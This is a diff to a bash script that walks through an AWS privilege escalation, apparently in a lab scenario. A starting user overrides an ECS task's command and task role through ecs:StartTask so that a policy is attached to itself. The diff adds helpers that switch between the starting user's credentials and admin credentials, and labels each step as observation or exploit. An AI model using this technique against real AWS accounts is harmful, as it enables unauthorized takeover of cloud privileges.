@@ -74,6 +74,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Retrieve admin cleanup credentials
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+
+if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -93,12 +102,22 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_user_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -131,7 +150,9 @@ else
 fi
 echo ""
 
+# [OBSERVATION] Check current policies attached to starting user
 # Step 5: Check for attached policies (should have none or minimal)
+use_admin_creds
 echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
 echo "Listing attached policies for: $STARTING_USER"
 show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
@@ -143,6 +164,7 @@ else
 fi
 echo -e "${GREEN}✓ Verified current policy state${NC}\n"
 
+# [OBSERVATION] Discover existing task definitions in the cluster
 # Step 6: Discover the pre-existing task definition
 echo -e "${YELLOW}Step 6: Discovering existing task definitions in the cluster${NC}"
 echo "Listing task definitions with family prefix: $EXISTING_TASK_FAMILY"
@@ -163,6 +185,7 @@ echo -e "${BLUE}We will exploit the existing task definition using ecs:StartTask
 echo -e "${BLUE}to override both the command AND the taskRoleArn.${NC}"
 echo -e "${GREEN}✓ Identified existing task definition to exploit${NC}\n"
 
+# [OBSERVATION] Retrieve container instance ARN from the cluster
 # Step 7: Retrieve the container instance ARN
 echo -e "${YELLOW}Step 7: Retrieving container instance ARN from ECS cluster${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
@@ -184,7 +207,9 @@ fi
 echo "Container Instance ARN: $CONTAINER_INSTANCE_ARN"
 echo -e "${GREEN}✓ Retrieved container instance ARN${NC}\n"
 
+# [EXPLOIT] Start ECS task with overridden command and admin role
 # Step 8: Start ECS task with overrides to escalate privileges
+use_starting_user_creds
 echo -e "${YELLOW}Step 8: Starting ECS task with command and role overrides${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
 echo "Task Definition: $EXISTING_TASK_FAMILY"
@@ -246,7 +271,9 @@ fi
 echo "Task ARN: $TASK_ARN"
 echo -e "${GREEN}✓ Successfully started ECS task with overridden command and role!${NC}\n"
 
+# [OBSERVATION] Poll task status until completion
 # Step 9: Wait for task to complete
+use_admin_creds
 echo -e "${YELLOW}Step 9: Waiting for ECS task to complete${NC}"
 echo "Monitoring task status..."
 
@@ -305,6 +332,7 @@ echo "IAM changes can take time to propagate across AWS infrastructure..."
 sleep 15
 echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 
+# [OBSERVATION] Verify policy was attached to starting user
 # Step 11: Verify policy was attached to starting user
 echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
 echo "Checking attached policies for: $STARTING_USER"
